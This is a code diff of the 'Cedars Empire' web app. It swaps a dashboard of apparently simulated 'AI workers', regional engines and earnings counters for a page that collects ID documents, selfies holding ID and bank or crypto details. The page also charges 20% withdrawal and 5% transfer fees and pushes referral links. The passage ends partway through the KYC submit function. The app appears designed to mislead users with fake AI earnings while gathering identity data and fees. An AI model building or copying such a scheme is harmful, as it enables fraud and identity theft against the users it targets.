@@ -3,264 +3,255 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CEDARS EMPIRE - Live</title>
+<title>KYC & Withdraw - Cedars</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-*{box-sizing:border-box;font-family:Arial,sans-serif}
-body{background:#f1f3f6;margin:0;padding:16px;color:#0f1e2e}
-.top{display:flex;justify-content:space-between;align-items:center;background:#fff;padding:14px 18px;border-radius:14px}
-.top h1{margin:0;font-size:22px}
-.live{color:#0a9d6e;font-size:14px}
-.authBox{background:#fff;padding:20px;border-radius:14px;max-width:420px;margin:40px auto}
-.authBox input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:10px;font-size:16px}
-.authBox button{width:100%;padding:12px;border:none;border-radius:10px;background:#0a9d6e;color:#fff;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}
-.authBox button.secondary{background:#0f1e2e}
-.authBox button:disabled{opacity:.6}
-.msg{color:#c00;font-size:14px;min-height:18px;text-align:center}
-.actions{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}
-.actions button{background:#fff;border:1px solid #ddd;padding:12px 18px;border-radius:10px;font-weight:bold;cursor:pointer;font-size:15px}
-.actions button.green{background:#0a9d6e;color:#fff;border:none}
-.stats{display:flex;gap:12px;flex-wrap:wrap}
-.stat{flex:1;min-width:140px;background:#fff;padding:16px;border-radius:14px}
-.stat b{font-size:28px}
-.card{background:#fff;padding:18px;border-radius:14px;margin-top:14px}
-.big{text-align:center}
-.big .gear{font-size:60px;animation:spin 6s linear infinite;display:inline-block}
-@keyframes spin{to{transform:rotate(360deg)}}
-.engines{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
-.eng{flex:1;min-width:150px;background:#fff;padding:14px;border-radius:12px}
-.on{color:#fff;background:#0a9d6e;border:none;padding:5px 12px;border-radius:20px;font-weight:bold;cursor:pointer}
-.off{color:#fff;background:#999;border:none;padding:5px 12px;border-radius:20px;font-weight:bold;cursor:pointer}
-.grid{display:flex;gap:12px;flex-wrap:wrap;margin-top:14px}
-.grid .card{flex:1;min-width:280px;margin-top:0}
-table{width:100%;border-collapse:collapse;font-size:14px}
-td,th{padding:10px;text-align:left;border-bottom:1px solid #eee}
-.pill{background:#d6f5e8;color:#0a7a55;padding:4px 10px;border-radius:20px;font-weight:bold;font-size:12px}
-.bar{height:8px;background:#e5e7eb;border-radius:5px;overflow:hidden;margin-top:8px}
-.fill{height:100%;background:#0a9d6e;width:0%;transition:width .5s}
-.dot{width:9px;height:9px;background:#00c853;border-radius:50%;display:inline-block}
-.indicator{width:14px;height:14px;border-radius:50%;background:#0a9d6e;box-shadow:0 0 10px #0a9d6e,0 0 20px #0a9d6e;animation:pulse 1.5s infinite;display:inline-block}
-.indicator.off{background:#999;box-shadow:none;animation:none}
-@keyframes pulse{0%{transform:scale(1);opacity:1}50%{transform:scale(1.4);opacity:.7}100%{transform:scale(1);opacity:1}}
-.ai-panel{background:#0f1e2e;color:#fff;padding:14px;border-radius:14px;margin-top:14px}
-.ai-panel b{color:#00e68a}
-.ai-log{font-size:13px;line-height:1.6;max-height:120px;overflow:auto;margin-top:8px}
-.ai-panel button{background:#0a9d6e;color:#fff;border:none;padding:9px 14px;border-radius:9px;font-weight:bold;cursor:pointer;margin-right:6px;margin-top:6px}
-.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99;align-items:center;justify-content:center;padding:16px}
-.modal.open{display:flex}
-.modal-box{background:#fff;width:100%;max-width:420px;padding:20px;border-radius:14px}
-.modal-box input{width:100%;padding:11px;margin:8px 0;border:1px solid #ddd;border-radius:10px}
+body{font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:0}
+.topbar{background:#111;color:#fff;padding:15px;display:flex;justify-content:space-between}
+.topbar a{color:#fff;text-decoration:none}
+.card{background:#fff;margin:15px;padding:20px;border-radius:10px}
+label{display:block;margin-top:12px;font-weight:bold;font-size:14px}
+input,select{width:100%;padding:10px;margin-top:5px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
+button{width:100%;padding:12px;margin-top:15px;border:none;border-radius:6px;font-weight:bold;cursor:pointer}
+.btn-blue{background:#2563eb;color:#fff}.btn-green{background:#16a34a;color:#fff}.btn-grey{background:#e5e7eb}.btn-purple{background:#7c3aed;color:#fff}
+.status{padding:10px;border-radius:6px;margin-top:10px;font-weight:bold}
+.status.none{background:#fef3c7}.status.verified{background:#dcfce7}.status.pending{background:#dbeafe}.status.rejected{background:#fee2e2}
+table{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px}td,th{padding:8px;border-bottom:1px solid #eee;text-align:left}
+.calc{background:#f0f9ff;padding:12px;border-radius:8px;margin-top:12px;font-size:14px;line-height:1.8}
+.calc b{float:right}
+.warn{background:#fef3c7;padding:10px;border-radius:6px;font-size:13px;margin-top:10px}
 </style>
 </head>
 <body>
-<div class="top"><h1>CEDARS EMPIRE <span class="live">● Live</span></h1><div id="userEmail">👤 Guest</div></div>
-
-<div id="authSection" class="authBox">
-<h2 style="text-align:center;margin:0">Login / Register</h2>
-<p style="text-align:center;color:#666;font-size:14px">Create account to get your own real balance</p>
-<input id="email" type="email" placeholder="Email">
-<input id="password" type="password" placeholder="Password (min 6 chars)">
-<div id="authMsg" class="msg"></div>
-<button id="registerBtn" onclick="doRegister()">Create Account</button>
-<button id="loginBtn" class="secondary" onclick="doLogin()">Login</button>
-</div>
-
-<div id="dashSection" style="display:none">
-<div class="actions">
-<button onclick="showProfile()">👤 Profile</button>
-<button class="green" id="depositBtn" onclick="toggleDeposit()">🏦 Deposit <span id="depositState">ON</span></button>
-<button onclick="document.getElementById('taskSection').scrollIntoView()">☰ Task</button>
-<button onclick="window.location.href='kyc.html'" class="green">↗ Withdraw</button>
-<button onclick="showReferral()">👥 Referral</button>
-<button onclick="doLogout()" style="background:#ffe5e5">Logout</button>
-</div>
-
-<div class="stats">
-<div class="stat">🤖 AI Workers Online<br><b id="workerCount">100</b><br><small>Online now</small></div>
-<div class="stat">💶 Total Earned - Never Resets<br><b id="earned">€0.00</b><br><small>Live updating • Keeps accumulating</small></div>
-<div class="stat">🎯 AI Target €2500<br><b id="pct">0%</b><br><small id="countdown">Next cycle in 24:00:00</small><div class="bar"><div class="fill" id="barFill"></div></div></div>
-</div>
+<div class="topbar"><b>Cedars</b><a href="index.html">← Back Home</a></div>
 
 <div class="card">
-<h3 style="margin-top:0">💰 Balance Table</h3>
-<table>
-<tr><th>Available Balance</th><td><b id="balAvailable">€0.00</b></td><td><small>Withdrawable / KYC withdrawals from here</small></td></tr>
-<tr><th>Reserved Balance</th><td><b id="balReserved">€0.00</b></td><td><small>Held for pending tasks / rewards</small></td></tr>
-<tr><th>Earned Balance</th><td><b id="balEarned">€0.00</b></td><td><small>Total ever earned - never resets</small></td></tr>
-<tr><th>Central Reserve</th><td><b id="balCentral">€0.00</b></td><td><small>Platform reserve - 80% of every reward</small></td></tr>
-</table>
+<h2>My Profile</h2>
+<p id="userEmail">Loading...</p>
+<p id="myId">My Cedars ID: ...</p>
+<p id="myRef">My Referral: ... <button onclick="copyRef()" style="width:auto;padding:6px 12px">Copy</button></p>
+<div id="statusBox" class="status none">Checking KYC...</div>
+<button class="btn-grey" onclick="loadProfile()">Refresh Status</button>
 </div>
 
-<div class="card big">
-<h2 style="margin:0">CEDARS CENTRAL ENGINE</h2>
-<div style="display:flex;align-items:center;justify-content:center;gap:10px;margin:10px 0"><div class="indicator" id="central-engine-status"></div><span id="masterStatus">RUNNING</span></div>
-<div class="gear">⚙️</div>
-<p>100 AI Workers Total • Core processing optimal</p>
-<p id="aiBrainStatus" style="color:#0a7a55;font-weight:bold">🧠 AI Brain: Initializing...</p>
+<div class="card" id="kycCard">
+<h2>KYC Verification - Global 🌍</h2>
+<p><small>Open to all countries. No country is blocked.</small></p>
+<label>Full Name</label><input id="fullName" type="text" placeholder="e.g. Bonny Emmanuel">
+<label>Country of Origin</label>
+<select id="country">
+<option value="">Select Country</option>
+<option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Andorra</option><option>Angola</option><option>Antigua and Barbuda</option><option>Argentina</option><option>Armenia</option><option>Australia</option><option>Austria</option><option>Azerbaijan</option><option>Bahamas</option><option>Bahrain</option><option>Bangladesh</option><option>Barbados</option><option>Belarus</option><option>Belgium</option><option>Belize</option><option>Benin</option><option>Bhutan</option><option>Bolivia</option><option>Bosnia and Herzegovina</option><option>Botswana</option><option>Brazil</option><option>Brunei</option><option>Bulgaria</option><option>Burkina Faso</option><option>Burundi</option><option>Cambodia</option><option>Cameroon</option><option>Canada</option><option>Cape Verde</option><option>Central African Republic</option><option>Chad</option><option>Chile</option><option>China</option><option>Colombia</option><option>Comoros</option><option>Congo</option><option>Congo DR</option><option>Costa Rica</option><option>Croatia</option><option>Cuba</option><option>Cyprus</option><option>Czech Republic</option><option>Denmark</option><option>Djibouti</option><option>Dominica</option><option>Dominican Republic</option><option>Ecuador</option><option>Egypt</option><option>El Salvador</option><option>Equatorial Guinea</option><option>Eritrea</option><option>Estonia</option><option>Eswatini</option><option>Ethiopia</option><option>Fiji</option><option>Finland</option><option>France</option><option>Gabon</option><option>Gambia</option><option>Georgia</option><option>Germany</option><option>Ghana</option><option>Greece</option><option>Grenada</option><option>Guatemala</option><option>Guinea</option><option>Guinea-Bissau</option><option>Guyana</option><option>Haiti</option><option>Honduras</option><option>Hungary</option><option>Iceland</option><option>India</option><option>Indonesia</option><option>Iran</option><option>Iraq</option><option>Ireland</option><option>Israel</option><option>Italy</option><option>Jamaica</option><option>Japan</option><option>Jordan</option><option>Kazakhstan</option><option>Kenya</option><option>Kiribati</option><option>Kuwait</option><option>Kyrgyzstan</option><option>Laos</option><option>Latvia</option><option>Lebanon</option><option>Lesotho</option><option>Liberia</option><option>Libya</option><option>Liechtenstein</option><option>Lithuania</option><option>Luxembourg</option><option>Madagascar</option><option>Malawi</option><option>Malaysia</option><option>Maldives</option><option>Mali</option><option>Malta</option><option>Marshall Islands</option><option>Mauritania</option><option>Mauritius</option><option>Mexico</option><option>Micronesia</option><option>Moldova</option><option>Monaco</option><option>Mongolia</option><option>Montenegro</option><option>Morocco</option><option>Mozambique</option><option>Myanmar</option><option>Namibia</option><option>Nauru</option><option>Nepal</option><option>Netherlands</option><option>New Zealand</option><option>Nicaragua</option><option>Niger</option><option>Nigeria</option><option>North Korea</option><option>North Macedonia</option><option>Norway</option><option>Oman</option><option>Pakistan</option><option>Palau</option><option>Palestine</option><option>Panama</option><option>Papua New Guinea</option><option>Paraguay</option><option>Peru</option><option>Philippines</option><option>Poland</option><option>Portugal</option><option>Qatar</option><option>Romania</option><option>Russia</option><option>Rwanda</option><option>Saint Kitts and Nevis</option><option>Saint Lucia</option><option>Saint Vincent</option><option>Samoa</option><option>San Marino</option><option>Sao Tome and Principe</option><option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option><option>Seychelles</option><option>Sierra Leone</option><option>Singapore</option><option>Slovakia</option><option>Slovenia</option><option>Solomon Islands</option><option>Somalia</option><option>South Africa</option><option>South Korea</option><option>South Sudan</option><option>Spain</option><option>Sri Lanka</option><option>Sudan</option><option>Suriname</option><option>Sweden</option><option>Switzerland</option><option>Syria</option><option>Taiwan</option><option>Tajikistan</option><option>Tanzania</option><option>Thailand</option><option>Togo</option><option>Tonga</option><option>Trinidad and Tobago</option><option>Tunisia</option><option>Turkey</option><option>Turkmenistan</option><option>Tuvalu</option><option>Uganda</option><option>Ukraine</option><option>United Arab Emirates</option><option>United Kingdom</option><option>United States</option><option>Uruguay</option><option>Uzbekistan</option><option>Vanuatu</option><option>Vatican City</option><option>Venezuela</option><option>Vietnam</option><option>Yemen</option><option>Zambia</option><option>Zimbabwe</option>
+</select>
+<label>ID / Passport Number</label><input id="idNumber" type="text" placeholder="e.g. CM90088100D4L">
+<label>Document Type</label><select id="docType"><option>National ID</option><option>Passport</option><option>Driving License</option><option>NIN</option><option>Voter Card</option></select>
+<label>Upload ID Photo (Front)</label><input id="docFile" type="file" accept="image/*,.pdf">
+<label>Selfie Holding ID</label><input id="selfieFile" type="file" accept="image/*">
+<button class="btn-blue" id="kycBtn" onclick="submitKYC()">Submit KYC for Verification</button>
+<p id="kycMsg"></p>
 </div>
 
-<div class="ai-panel">
-<b>🧠 360° AI OPERATIONS</b> <span id="aiMode">• AUTO MODE: ON</span><br>
-<small>AI Sourcing • AI Assignment • AI Verification • AI Support • AI Content</small><br>
-<button onclick="aiGenerateTasks()">🤖 Generate Tasks</button>
-<button onclick="aiVerifyLast()">✅ Verify Last Task</button>
-<button onclick="aiSupport()">💬 AI Support</button>
-<button onclick="aiToggleAuto()">⏯️ Toggle AI Auto</button>
-<div class="ai-log" id="aiLog">AI log waiting...</div>
+<!-- WITHDRAW WITH CALCULATOR -->
+<div class="card">
+<h2>Withdraw</h2>
+<p><small>Available: <b id="availText">€0.00</b> - Must be KYC Verified</small></p>
+<div class="warn">⚠️ <b>Rules:</b> Min <b>$100</b> - Max <b>$20,000</b> per withdraw. Withdraw Fee <b>20%</b>. You receive 80%.</div>
+<label>Method</label>
+<select id="withdrawMethod" onchange="updateMethodFields()"><option value="Bank Transfer">Bank Transfer - £ / $ / €</option><option value="PayPal">PayPal - £ / $ / €</option><option value="Crypto">Crypto - BTC / ETH / USDT</option></select>
+<div id="fiatFields">
+<label>Currency</label><select id="withdrawCurrency" onchange="updateCurrencyLabel()"><option value="GBP">£ GBP</option><option value="USD">$ USD</option><option value="EUR">€ EUR</option></select>
+<label id="amountLabel">Amount (£ GBP)</label><input id="withdrawAmount" type="number" placeholder="e.g. 500" min="100" max="20000" step="0.01" oninput="calcWithdraw()">
+</div>
+<div id="cryptoAmountFields" style="display:none">
+<label>Crypto Currency</label><select id="cryptoCurrency" onchange="calcWithdraw()"><option value="BTC">BTC</option><option value="ETH">ETH</option><option value="USDT">USDT</option></select>
+<label>Amount (Crypto)</label><input id="cryptoAmount" type="number" placeholder="e.g. 100 USDT / 0.01 BTC" step="0.0001" oninput="calcWithdraw()">
+<small id="cryptoHint">For USDT: Min 100, Max 20000. For BTC/ETH: Min 0.002</small>
+</div>
+<!-- CALCULATOR -->
+<div class="calc" id="withdrawCalc">
+Withdraw Calculator<br>
+You Withdraw: <b id="calcGross">0.00</b><br>
+Fee (20%): <b id="calcFee" style="color:#dc2626">- 0.00</b><br>
+You Receive: <b id="calcNet" style="color:#16a34a">0.00</b><br>
+<span id="calcError" style="color:#dc2626;font-weight:bold"></span>
+</div>
+<div id="bankFields"><label>Account Name</label><input id="bankName" type="text" placeholder="Name on bank account"><label>Bank Account / IBAN</label><input id="bankDetails" type="text" placeholder="IBAN / Account Number"></div>
+<div id="paypalFields" style="display:none"><label>PayPal Email</label><input id="paypalEmail" type="email" placeholder="you@email.com"></div>
+<div id="cryptoFields" style="display:none"><label>Crypto Wallet Address</label><input id="cryptoWalletAddress" type="text" placeholder="0x... or bc1..."><label>Network</label><input id="cryptoNetwork" type="text" placeholder="ERC20, TRC20, BTC"></div>
+<button class="btn-green" onclick="doWithdraw()">Request Withdraw</button><p id="withdrawMsg"></p>
 </div>
 
-<div class="engines" id="engines"></div>
-
-<div class="grid">
-<div class="card"><h3>🤖 AI Workers Live</h3><div id="workersLive">Waiting...</div><p style="color:#0a7a55">+95 more workers working...</p></div>
-<div class="card" id="taskSection"><h3>Task Activity</h3><table><thead><tr><th>Region</th><th>Tasks</th><th>Status</th><th>Last</th></tr></thead><tbody id="taskTable"></tbody></table>
-<div style="display:flex;gap:10px;margin-top:14px"><div style="flex:1;background:#f8fafc;padding:10px;border-radius:10px">Withdraw Available<br><b id="withdrawBal">€0</b></div><div style="flex:1;background:#f8fafc;padding:10px;border-radius:10px">Transactions<br><b id="txCount">0</b></div></div>
-<button onclick="window.location.href='kyc.html'" class="green" style="width:100%;padding:11px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:12px">↗ Go To Withdraw Page</button>
+<!-- P2P TRANSFER -->
+<div class="card">
+<h2>💸 P2P Transfer - Member to Member</h2>
+<p><small>Send float from your Available Balance to another member's Cedars ID. Fee <b>5%</b>.</small></p>
+<div class="warn">Example: Send 100 → Fee 5 → Receiver gets <b>95</b>. You pay 100.</div>
+<label>Receiver Cedars ID</label><input id="p2pTo" type="text" placeholder="e.g. CDAB1234">
+<label>Amount to Send</label><input id="p2pAmount" type="number" placeholder="e.g. 50" min="1" step="0.01" oninput="calcP2P()">
+<div class="calc">
+P2P Calculator<br>
+You Send: <b id="p2pGross">0.00</b><br>
+Fee (5%): <b id="p2pFee" style="color:#dc2626">- 0.00</b><br>
+Receiver Gets: <b id="p2pNet" style="color:#16a34a">0.00</b><br>
 </div>
-</div>
+<button class="btn-purple" onclick="doP2P()">Send P2P Transfer</button>
+<p id="p2pMsg"></p>
+<div id="p2pList">Loading P2P history...</div>
 </div>
 
-<!-- PROFILE MODAL -->
-<div id="profileModal" class="modal"><div class="modal-box">
-<h3 style="margin:0">👤 My Profile</h3>
-<p id="profileInfo" style="font-size:14px;line-height:1.7">Loading...</p>
-<label>Full Name</label>
-<input id="profileName" placeholder="Your full name">
-<button onclick="saveProfile()" style="width:100%;padding:11px;background:#0a9d6e;color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer">Save Profile</button>
-<button onclick="window.location.href='kyc.html'" style="width:100%;padding:11px;background:#0f1e2e;color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:8px">Go to KYC & Withdraw</button>
-<button onclick="closeProfile()" style="width:100%;padding:11px;background:#eee;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:8px">Close</button>
-</div></div>
+<div class="card"><h2>My Withdrawals</h2><button class="btn-grey" onclick="loadWithdrawals()">Refresh</button><div id="withdrawList">Loading...</div></div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
-const SUPABASE_URL = 'https://ipyvewpjtpgfuqfwizlr.supabase.co';
-const SUPABASE_KEY = 'sb_publishable_VAHMj985hPKE8nPyO8Btcg_Sgmmr3Rm';
-const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-let currentUser = null;
-let earned = 0; let availableBal = 0; let reservedBal = 0; let centralReserve = 0; let totalTasks = 0; let depositOn = true;
-let engines = [{id:1,name:"Africa",on:true,tasks:32},{id:2,name:"Asia",on:true,tasks:28},{id:3,name:"America",on:false,tasks:0},{id:4,name:"Europe",on:true,tasks:19},{id:5,name:"Oceania",on:false,tasks:0}];
-let workerNames = ["Vision Worker","Transcription Worker","Rating Worker","Data Worker","Text Worker"];
-let targetEnd = new Date(); targetEnd.setHours(24,0,0,0);
-let aiAuto = true; let lastTaskInfo = null;
+const SUPABASE_URL="https://ipyvewpjtpgfuqfwizlr.supabase.co";
+const SUPABASE_KEY="sb_publishable_VAHMj985hPKE8nPyO8Btcg_Sgmmr3Rm";
+const supabase=window.supabase.createClient(SUPABASE_URL,SUPABASE_KEY);
+let currentUser=null,currentKycStatus=null,avail=0,myCedarsId="";
+function updateCurrencyLabel(){const c=document.getElementById('withdrawCurrency').value;document.getElementById('amountLabel').innerText=c==='GBP'?'Amount (£ GBP)':c==='USD'?'Amount ($ USD)':'Amount (€ EUR)';}
+function updateMethodFields(){const m=document.getElementById('withdrawMethod').value;const isCrypto=m==='Crypto';document.getElementById('bankFields').style.display=m==='Bank Transfer'?'block':'none';document.getElementById('paypalFields').style.display=m==='PayPal'?'block':'none';document.getElementById('cryptoFields').style.display=isCrypto?'block':'none';document.getElementById('fiatFields').style.display=isCrypto?'none':'block';document.getElementById('cryptoAmountFields').style.display=isCrypto?'block':'none';calcWithdraw();}
+function copyRef(){ if(!myCedarsId) return; navigator.clipboard.writeText('https://cedarsempire.com/r/'+myCedarsId); alert('Copied: cedarsempire.com/r/'+myCedarsId); }
 
-function aiLog(msg){ let el=document.getElementById('aiLog'); if(!el) return; el.innerHTML='• '+msg+'<br>'+el.innerHTML; }
-function aiBrainReady(){ let el=document.getElementById('aiBrainStatus'); if(el) el.innerText='🧠 AI Brain: ACTIVE • 99% AI Operations'; aiLog('AI Brain connected to Central Engine'); }
-function updateCountdown(){ let diff=targetEnd-new Date(); if(diff<=0){ targetEnd=new Date(); targetEnd.setHours(24,0,0,0); diff=targetEnd-new Date(); } let h=Math.floor(diff/3600000),m=Math.floor(diff%3600000/60000),s=Math.floor(diff%60000/1000); document.getElementById('countdown').innerText='Next cycle in '+String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0'); }
-setInterval(updateCountdown,1000); updateCountdown();
-function showMsg(t,color){ let el=document.getElementById('authMsg'); el.innerText=t; el.style.color=color||'#c00'; }
-
-async function doRegister(){
-  const email=document.getElementById('email').value.trim();
-  const password=document.getElementById('password').value;
-  if(!email||password.length<6){ showMsg('Enter valid email and password min 6 chars'); return; }
-  document.getElementById('registerBtn').disabled=true; showMsg('Creating account...','#0a7a55');
-  const {data,error}=await client.auth.signUp({email,password});
-  document.getElementById('registerBtn').disabled=false;
-  if(error){ showMsg('SIGNUP FAILED: '+error.message); return; }
-  if(data.user && !data.session){ showMsg('Account created! Check email to confirm, then click Login.','#0a7a55'); return; }
-  showMsg('Account created! Logging you in...','#0a7a55'); await afterLogin();
-}
-async function doLogin(){
-  const email=document.getElementById('email').value.trim();
-  const password=document.getElementById('password').value;
-  showMsg('Logging in...','#0a7a55');
-  const {data,error}=await client.auth.signInWithPassword({email,password});
-  if(error){ showMsg('LOGIN FAILED: '+error.message); return; }
-  await afterLogin();
-}
-async function doLogout(){ await client.auth.signOut(); location.reload(); }
-
-async function afterLogin(){
-  const {data}=await client.auth.getUser(); if(!data.user) return;
-  currentUser=data.user;
-  document.getElementById('userEmail').innerText=currentUser.email;
-  document.getElementById('authSection').style.display='none';
-  document.getElementById('dashSection').style.display='block';
-  try{ await client.from('profiles').upsert({id:currentUser.id,email:currentUser.email}); }catch(e){ console.log(e); }
-  let res=await client.from('balances').select('*').eq('user_id',currentUser.id).single();
-  if(!res.data){
-    await client.from('balances').insert({user_id:currentUser.id,amount:0,available_balance:0,reserved_balance:0,earned_balance:0,central_reserve:0});
-    earned=0; availableBal=0; reservedBal=0; centralReserve=0;
-  } else {
-    earned=parseFloat(res.data.earned_balance ?? res.data.amount ?? 0);
-    availableBal=parseFloat(res.data.available_balance ?? 0);
-    reservedBal=parseFloat(res.data.reserved_balance ?? 0);
-    centralReserve=parseFloat(res.data.central_reserve ?? 0);
+// WITHDRAW CALCULATOR - 20% fee
+function calcWithdraw(){
+  const isCrypto=document.getElementById('withdrawMethod').value==='Crypto';
+  const cryptoCur=isCrypto?document.getElementById('cryptoCurrency').value:'';
+  let amount=parseFloat(isCrypto?document.getElementById('cryptoAmount').value:document.getElementById('withdrawAmount').value)||0;
+  let fee=amount*0.20; let net=amount-fee;
+  let cur=isCrypto?cryptoCur:document.getElementById('withdrawCurrency').value;
+  document.getElementById('calcGross').innerText=amount.toFixed(2)+' '+cur;
+  document.getElementById('calcFee').innerText='- '+fee.toFixed(2)+' '+cur;
+  document.getElementById('calcNet').innerText=net.toFixed(2)+' '+cur;
+  let err='';
+  if(amount>0){
+    if(!isCrypto && (amount<100 || amount>20000)) err='⚠️ Must be between 100 and 20000';
+    if(isCrypto && cryptoCur==='USDT' && (amount<100 || amount>20000)) err='⚠️ USDT: Min 100 - Max 20000';
+    if(isCrypto && (cryptoCur==='BTC'||cryptoCur==='ETH') && amount<0.002) err='⚠️ Min 0.002 for BTC/ETH';
+    if(amount>avail) err='⚠️ Amount more than your Available Balance €'+avail.toFixed(2);
   }
-  updateDisplay(); renderEngines(); runCycle(); loadTxCount(); aiBrainReady();
+  document.getElementById('calcError').innerText=err;
 }
-async function loadTxCount(){
-  let {data}=await client.from('transactions').select('id').eq('user_id',currentUser.id);
-  document.getElementById('txCount').innerText=data?data.length:0;
+// P2P CALCULATOR - 5% fee
+function calcP2P(){
+  let amount=parseFloat(document.getElementById('p2pAmount').value)||0;
+  let fee=amount*0.05; let net=amount-fee;
+  document.getElementById('p2pGross').innerText=amount.toFixed(2);
+  document.getElementById('p2pFee').innerText='- '+fee.toFixed(2);
+  document.getElementById('p2pNet').innerText=net.toFixed(2);
 }
-async function saveBalance(){
-  if(!currentUser) return;
-  await client.from('balances').upsert({user_id:currentUser.id,amount:earned,available_balance:availableBal,reserved_balance:reservedBal,earned_balance:earned,central_reserve:centralReserve});
+async function loadProfile(){
+  const {data:{user}}=await supabase.auth.getUser();
+  if(!user){document.getElementById('userEmail').innerText='Not logged in - please login first';return;}
+  currentUser=user; document.getElementById('userEmail').innerText=user.email;
+  let {data:prof}=await supabase.from('profiles').select('*').eq('id',user.id).maybeSingle();
+  if(!prof){ myCedarsId='CD'+user.id.replace(/-/g,'').substring(0,6).toUpperCase(); await supabase.from('profiles').insert({id:user.id,email:user.email,cedars_id:myCedarsId,referral_code:myCedarsId}); }
+  else { myCedarsId=prof.cedars_id||prof.referral_code||('CD'+user.id.replace(/-/g,'').substring(0,6).toUpperCase()); if(!prof.cedars_id) await supabase.from('profiles').update({cedars_id:myCedarsId,referral_code:myCedarsId}).eq('id',user.id); }
+  document.getElementById('myId').innerText='My Cedars ID: '+myCedarsId;
+  document.getElementById('myRef').innerHTML='My Referral: <b>cedarsempire.com/r/'+myCedarsId+'</b> <button onclick="copyRef()" style="width:auto;padding:6px 12px">Copy</button>';
+  const {data}=await supabase.from('kyc').select('status').eq('user_id',user.id).order('created_at',{ascending:false}).limit(1).maybeSingle();
+  currentKycStatus=data?data.status:null;
+  const box=document.getElementById('statusBox');
+  if(currentKycStatus==='verified'){box.className='status verified';box.innerText='✅ VERIFIED - You can withdraw';}
+  else if(currentKycStatus==='pending'){box.className='status pending';box.innerText='⏳ PENDING - Waiting for admin approval';}
+  else if(currentKycStatus==='rejected'){box.className='status rejected';box.innerText='❌ REJECTED - Please resubmit KYC';}
+  else{box.className='status none';box.innerText='⚠️ NOT SUBMITTED - Submit KYC below';}
+  const {data:bal}=await supabase.from('balances').select('available_balance').eq('user_id',user.id).maybeSingle();
+  avail=bal?parseFloat(bal.available_balance||0):0;
+  document.getElementById('availText').innerText='€'+avail.toFixed(2);
+  loadWithdrawals(); loadP2P();
 }
-function updateDisplay(){
-  document.getElementById('earned').innerText="€"+earned.toFixed(2);
-  document.getElementById('withdrawBal').innerText="€"+availableBal.toFixed(2);
-  document.getElementById('balAvailable').innerText="€"+availableBal.toFixed(2);
-  document.getElementById('balReserved').innerText="€"+reservedBal.toFixed(2);
-  document.getElementById('balEarned').innerText="€"+earned.toFixed(2);
-  document.getElementById('balCentral').innerText="€"+centralReserve.toFixed(2);
-  let pct=Math.min(100,(earned/2500*100));
-  document.getElementById('pct').innerText=pct.toFixed(1)+"%";
-  document.getElementById('barFill').style.width=pct+"%";
-}
-function toggleDeposit(){ depositOn=!depositOn; document.getElementById('depositState').innerText=depositOn?"ON":"OFF"; document.getElementById('depositBtn').style.background=depositOn?"#0a9d6e":"#999"; }
-function toggleEngine(id){ let e=engines.find(x=>x.id===id); e.on=!e.on; aiLog('AI: '+e.name+' Engine turned '+(e.on?'ON':'OFF')); renderEngines(); }
-function renderEngines(){
-  document.getElementById('engines').innerHTML=engines.map(e=>`<div class="eng"><div style="display:flex;justify-content:space-between;align-items:center"><span>🤖 Sub-Engine ${e.id}</span><div style="display:flex;align-items:center;gap:6px"><div class="indicator ${e.on?'':'off'}"></div><span>${e.on?'ON':'OFF'}</span></div></div><div style="font-size:32px">🦾</div><b style="font-size:18px">${e.name} Engine</b><br><small>20 AI Workers</small><br><small>${e.on?'Workers Active':'Workers Paused'}</small><br><small>Tasks: ${e.tasks}</small><br><br><button class="${e.on?'on':'off'}" onclick="toggleEngine(${e.id})">${e.on?'ON':'OFF'}</button></div>`).join('');
-  let active=engines.filter(e=>e.on).length;
-  document.getElementById('masterStatus').innerText=active>0?"RUNNING":"PAUSED";
-  document.getElementById('workerCount').innerText=active*20;
-  document.getElementById('central-engine-status').className='indicator '+(active>0?'':'off');
-}
-async function showProfile(){
+async function submitKYC(){
+  const btn=document.getElementById('kycBtn');
+  const fullName=document.getElementById('fullName').value.trim();
+  const country=document.getElementById('country').value;
+  const idNumber=document.getElementById('idNumber').value.trim();
+  const docFile=document.getElementById('docFile').files[0];
+  const selfieFile=document.getElementById('selfieFile').files[0];
   if(!currentUser) return alert("Please login first");
-  document.getElementById('profileModal').classList.add('open');
-  document.getElementById('profileInfo').innerText='Loading...';
-  let {data:prof}=await client.from('profiles').select('*').eq('id',currentUser.id).maybeSingle();
-  let {data:kyc}=await client.from('kyc').select('status').eq('user_id',currentUser.id).order('created_at',{ascending:false}).limit(1).maybeSingle();
-  let {data:wd}=await client.from('withdrawals').select('id').eq('user_id',currentUser.id);
-  document.getElementById('profileInfo').innerHTML=`Email: <b>${currentUser.email}</b><br>User ID: ${currentUser.id.slice(0,8)}...<br>Full Name: <b>${prof?.full_name||'Not set'}</b><br>KYC Status: <b>${kyc?.status||'not submitted'}</b><br>Withdrawals: <b>${wd?wd.length:0}</b><br>Available: <b>€${availableBal.toFixed(2)}</b>`;
-  document.getElementById('profileName').value=prof?.full_name||'';
+  if(!fullName) return alert("Enter Full Name");
+  if(!country) return alert("Select your Country");
+  if(!idNumber) return alert("Enter ID / Passport Number");
+  btn.innerText='Submitting... Please wait'; btn.disabled=true;
+  document.getElementById('kycMsg').innerText='Submitting...';
+  try{
